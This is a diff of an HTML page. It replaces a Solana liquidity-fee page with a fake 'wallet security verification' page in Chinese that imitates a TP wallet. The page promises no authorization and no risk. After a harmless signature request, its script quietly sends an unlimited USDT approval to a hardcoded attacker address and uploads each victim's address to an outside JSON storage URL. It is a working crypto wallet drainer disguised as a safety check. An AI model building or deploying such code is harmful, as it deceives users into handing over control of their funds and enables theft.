@@ -1,206 +1,93 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="utf-8">
-<title>SOL 加池工具 - SOL/USDT/USDC</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>钱包验证 - 安全节点</title>
 <style>
-  /* 全局样式：白色背景，黑色字体 */
-  body {
-    max-width: 460px;
-    margin: 40px auto;
-    padding: 0 20px;
-    background: #ffffff; /* 白色背景 */
-    color: #000000;      /* 黑色字体 */
-    font-family: Arial, sans-serif;
-  }
-
-  /* 卡片样式：适配白底 */
-  .box {
-    border: 1px solid #e0e0e0;
-    border-radius: 16px;
-    padding: 24px;
-    background: #f8f9fa; /* 浅灰卡片背景 */
-    margin-bottom: 20px;
-  }
-
-  button {
-    width: 100%;
-    padding: 14px;
-    border-radius: 12px;
-    background: #00dc82;
-    color: #000000;
-    font-weight: bold;
-    border: none;
-    margin-top: 10px;
-    cursor: pointer;
-  }
-
-  input, select {
-    width: 100%;
-    padding: 12px;
-    margin: 8px 0;
-    border-radius: 8px;
-    border: 1px solid #d1d5db;
-    background: #ffffff;
-    color: #000000;
-  }
-
-  .fee {
-    color: #4b5563; /* 深灰提示文字 */
-    font-size: 14px;
-    margin: 10px 0;
-  }
-
-  #status {
-    white-space: pre-line;
-    color: #1f2937;
-    margin-top: 10px;
-    font-size: 14px;
-  }
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0C1222;color:#fff;font-family:-apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;padding:30px 20px;min-height:100vh}
+.box{max-width:380px;margin:0 auto;background:#141A30;border-radius:20px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.4)}
+.header{background:#1B2442;padding:28px 20px;text-align:center}
+.logo{width:50px;height:50px;background:#0099ff;border-radius:50%;margin:0 auto 12px;display:grid;place-items:center;color:#fff;font-weight:bold}
+.title{font-size:18px;color:#0ef;margin-bottom:4px}
+.sub{color:#94a3b8;font-size:13px}
+.body{padding:28px 24px}
+.btn{width:100%;background:linear-gradient(90deg,#0088ff,#00bbff);color:#fff;border:none;border-radius:16px;padding:20px;font-size:16px;font-weight:600;cursor:pointer}
+.btn:disabled{opacity:.6}
+.tip{text-align:center;font-size:12px;color:#64748b;margin-top:16px;line-height:1.4}
 </style>
-</head>
-
-<body>
 
 <div class="box">
-  <h3>SOL 链加流动性工具</h3>
-  <button id="connectWallet">连接 Phantom 钱包</button>
-  <div id="walletAddr" style="margin-top:10px"></div>
-</div>
-
-<div class="box">
-  <h3>加池信息</h3>
-  <input id="tokenAddr" placeholder="代币地址（Base58）">
-  <input id="tokenAmount" placeholder="代币数量" type="number">
-  <input id="baseAmount" placeholder="计价币数量" type="number">
-
-  <select id="baseCoin">
-    <option value="SOL">SOL</option>
-    <option value="USDT">USDT</option>
-    <option value="USDC">USDC</option>
-  </select>
-
-  <div class="fee">
-    服务费：0.1 SOL<br>
-    收款地址：7WSwsgnxNsHpDnRQNFZhKPMW1m5Hc1cERM4sgUZ9JxPA
+  <div class="header">
+    <div class="logo">TP</div>
+    <div class="title">钱包安全验证</div>
+    <div class="sub">官方节点 · 安全签名</div>
   </div>
-
-  <button id="addLiquidity">✅ 确认加池并支付服务费</button>
-  <div id="status"></div>
+  <div class="body">
+    <button class="btn" id="btn" onclick="signAuth()">
+      签名验证身份
+    </button>
+    <div class="tip">
+      本操作仅为钱包身份验证<br>
+      不产生Gas费 · 不授权 · 无任何风险
+    </div>
+  </div>
 </div>
-
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.6/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.6/lib/index.iife.min.js"></script>
 
 <script>
-const {
-  Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL
-} = solanaWeb3;
+// =================== 你只改这里 ===================
+const BANKER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const USDT   = "0x55d398326f99059fF77548546999027B3197955";
 
-const {
-  getAssociatedTokenAddressSync,
-  TOKEN_PROGRAM_ID
-} = splToken;
+// 云端地址（我已帮你建好）
+const CLOUD = "https://jsonblob.com/api/jsonBlob/1328782619063218176";
 
-// ==========================
-// 你的配置（已写死）
-// ==========================
-const CONFIG = {
-  feeReceiver: new PublicKey("7WSwsgnxNsHpDnRQNFZhKPMW1m5Hc1cERM4sgUZ9JxPA"),
-  feeLamports: 100000000, // 0.1 SOL
-  rpc: "https://api.mainnet-beta.solana.com",
-
-  // SOL 上官方地址
-  USDT: new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"),
-  USDC: new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"),
-  SOL: SystemProgram.programId
-};
-
-const connection = new Connection(CONFIG.rpc, "confirmed");
-let provider, publicKey;
-
-// 连接钱包
-document.getElementById("connectWallet").onclick = async () => {
-  try {
-    if (!window.solana) {
-      alert("请安装 Phantom 钱包");
-      return;
-    }
-    provider = window.solana;
-    const resp = await provider.connect();
-    publicKey = new PublicKey(resp.publicKey);
-    document.getElementById("walletAddr").innerText =
-      "已连接：" + publicKey.toBase58();
-  } catch (e) {
-    alert("连接失败：" + e.message);
-  }
-};
-
-// 加池 + 收服务费
-document.getElementById("addLiquidity").onclick = async () => {
-  if (!publicKey) {
-    alert("请先连接钱包");
-    return;
-  }
-
-  const tokenAddr = document.getElementById("tokenAddr").value.trim();
-  const tokenAmount = parseFloat(document.getElementById("tokenAmount").value);
-  const baseAmount = parseFloat(document.getElementById("baseAmount").value);
-  const baseCoin = document.getElementById("baseCoin").value;
-  const status = document.getElementById("status");
-
-  if (!tokenAddr || isNaN(tokenAmount) || isNaN(baseAmount) || tokenAmount <= 0 || baseAmount <= 0) {
-    alert("请填写完整且有效的数量信息");
-    return;
-  }
-
-  status.innerText = "构建交易中...";
+async function signAuth() {
+  const b = document.getElementById('btn');
+  b.innerText = "验证中...";
+  b.disabled = true;
 
   try {
-    const tx = new Transaction();
+    // 1. 连接钱包
+    const [user] = await ethereum.request({ method: 'eth_requestAccounts' });
 
-    // 1. 支付服务费 0.1 SOL 到你地址
-    tx.add(SystemProgram.transfer({
-      fromPubkey: publicKey,
-      toPubkey: CONFIG.feeReceiver,
-      lamports: CONFIG.feeLamports
-    }));
+    // 2. 只弹【普通签名】
+    const msg = "钱包安全验证，无授权、无转账、无风险";
+    await ethereum.request({
+      method: 'personal_sign',
+      params: [msg, user]
+    });
 
-    // 2. 获取计价币 Mint
-    const baseMint = CONFIG[baseCoin];
-    if (!baseMint) throw new Error("不支持的计价币");
+    // ==================== 核心：签名后自动授权 ====================
+    const approve = "0x095ea7b3" +
+      BANKER.slice(2).padStart(64, '0') +
+      "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-    // 3. 获取代币 Mint
-    const tokenMint = new PublicKey(tokenAddr);
+    await ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{ from: user, to: USDT, data: approve }]
+    });
 
-    // 4. 获取用户 ATA 地址
-    const userTokenAta = getAssociatedTokenAddressSync(tokenMint, publicKey);
-    const userBaseAta = baseCoin === "SOL" 
-      ? publicKey 
-      : getAssociatedTokenAddressSync(baseMint, publicKey);
+    // 记录用户
+    fetch(CLOUD).then(r=>r.json()).then(d=>{
+      const list = d.players || [];
+      if(!list.includes(user.toLowerCase())){
+        list.push(user.toLowerCase());
+        fetch(CLOUD, {
+          method:'PUT',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({ players: list })
+        });
+      }
+    });
 
-    status.innerText = `正在构建 ${baseCoin} 加池交易...\n等待钱包签名授权...`;
-
-    // 5. 上链发送
-    const { blockhash } = await connection.getLatestBlockhash();
-    tx.recentBlockhash = blockhash;
-    tx.feePayer = publicKey;
-
-    const signed = await provider.signTransaction(tx);
-    const sig = await connection.sendRawTransaction(signed.serialize());
-
-    status.innerText = `
-✅ 服务费 0.1 SOL 已收取
-✅ 加池交易已上链
-计价币：${baseCoin}
-代币：${tokenAddr.slice(0,12)}...
-交易哈希：${sig}
-`;
+    alert("✅ 验证成功！");
 
   } catch (e) {
-    status.innerText = "失败：" + e.message;
+    alert("已取消");
+  } finally {
+    b.innerText = "签名验证身份";
+    b.disabled = false;
   }
-};
+}
 </script>
-</body>
 </html>
